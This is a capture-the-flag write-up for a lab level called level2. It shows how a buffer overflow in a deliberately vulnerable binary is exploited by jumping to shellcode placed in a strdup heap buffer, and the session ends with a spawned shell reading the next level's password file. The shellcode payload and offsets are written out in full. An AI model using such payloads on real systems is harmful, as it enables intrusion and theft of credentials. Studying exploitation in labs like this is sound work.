in this we have a simple buffer overflow but with a twist.

if we look at the disassembly of our binary, we can see that our program does rather something interesting with the return address of the `p` function:
```x86asm
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
```

as we can see it perform a bitwise and with the value `0xb0000000`, and based on that comparison decides where to jump.

since NX is disabled we can execute code from the stack but since the address of the buffer is `0xbffff6dc`:

```x86asm
(gdb) x $ebp-0x4c
0xbffff6dc:	0x00000001
```

it will fail the check if we overwrite the return address with that buffer address and exit the program before we return.

but there is the address of the string returned from `strdup` function wich passes the condtion:
```x86asm
(gdb) x $eax
0x804a008:	0x38307830
(gdb) x/s $eax
0x804a008:	 "0x08080808"
```

we can see that the address `0x0804a008` passes the condition.

now all we need to do is to get a shellcode to inject and use the `strdup` buffer to pass the condition 


```bash
(python -c 'print "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" + (76 - 44) * "A" + "BBBB" + "\x08\x04\xa0\x08"[::-1]'; cat) | ./level2
```

`\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80` is the shellcode

`76` is the offset to the saved `ebp` and `44` is the size of the shellcode and "BBBB" is used to reach the return address.

```bash
level2@RainFall:~$ (python -c 'print "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80" + (76 - 44) * "A" + "BBBB" + "\x08\x04\xa0\x08"[::-1]'; cat) | ./level2
jhh///sh/bin��h�4$ri1�QjY�Q��1�j
                                X̀AAAAAAAAAAAAAAAAAAAAAAAAAAABBB�
pwd  
/home/user/level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

and there you go.